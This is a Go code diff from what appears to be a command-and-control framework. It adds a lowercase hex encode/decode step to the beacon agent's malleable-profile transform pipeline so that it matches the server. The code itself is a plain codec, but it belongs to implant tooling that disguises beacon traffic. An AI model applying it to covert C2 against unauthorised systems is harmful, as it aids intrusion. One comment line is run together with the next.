@@ -178,9 +178,17 @@ func agentExecTransform(data []byte, step agentTransformStep, encode bool) ([]by
 		return data, nil
 
 	case "print":
-		out := make([]byte, len(data))
-		copy(out, data)
-		return out, nil
+		// Printable hex codec, mirroring the server engine
+		// (internal/malleable/transform.go printableEncode/printableDecode):
+		// encode emits lowercase hex, decode accepts lowercase hex only and
+		// fails on odd length or non-hex input. Previously this was an
+		// identity no-op, which bricked beacons for any profile whose
+		// server_output/placement chain contains "print" (server hex-encodes,
+		// agent passed through).
+		if encode {
+			return agentPrintableEncode(data), nil
+		}
+		return agentPrintableDecode(data)
 
 	default:
 		out := make([]byte, len(data))
@@ -189,8 +197,38 @@ func agentExecTransform(data []byte, step agentTransformStep, encode bool) ([]by
 	}
 }
 
-// parseTransformSteps parses a serialized transform pipeline (the over-the-wire
-// form of a malleable profile's output transforms). Steps are separated by ';'
+// agentPrintableEncode emits lowercase hex, byte-for-byte identical to the
+// server's printableEncode.
+func agentPrintableEncode(data []byte) []byte {
+	const hex = "0123456789abcdef"
+	out := make([]byte, len(data)*2)
+	for i, b := range data {
+		out[i*2] = hex[b>>4]
+		out[i*2+1] = hex[b&0xF]
+	}
+	return out
+}
+
+// agentPrintableDecode mirrors the server's printableDecode: even-length
+// lowercase-hex input only, error otherwise.
+func agentPrintableDecode(data []byte) ([]byte, error) {
+	if len(data)%2 != 0 {
+		return nil, fmt.Errorf("printable decode: odd length")
+	}
+	const hex = "0123456789abcdef"
+	out := make([]byte, len(data)/2)
+	for i := 0; i < len(data); i += 2 {
+		hi := strings.IndexByte(hex, data[i])
+		lo := strings.IndexByte(hex, data[i+1])
+		if hi < 0 || lo < 0 {
+			return nil, fmt.Errorf("printable decode: invalid char at %d", i)
+		}
+		out[i/2] = byte(hi<<4) | byte(lo)
+	}
+	return out, nil
+}
+
+// parseTransformSteps parses a serialized transform pipeline (the over-the-wire// form of a malleable profile's output transforms). Steps are separated by ';'
 // and each step is "name" or "name:value". The order matches the server's apply
 // order; callers decode with encode=false, which reverses the order, so the
 // agent recovers the original body.
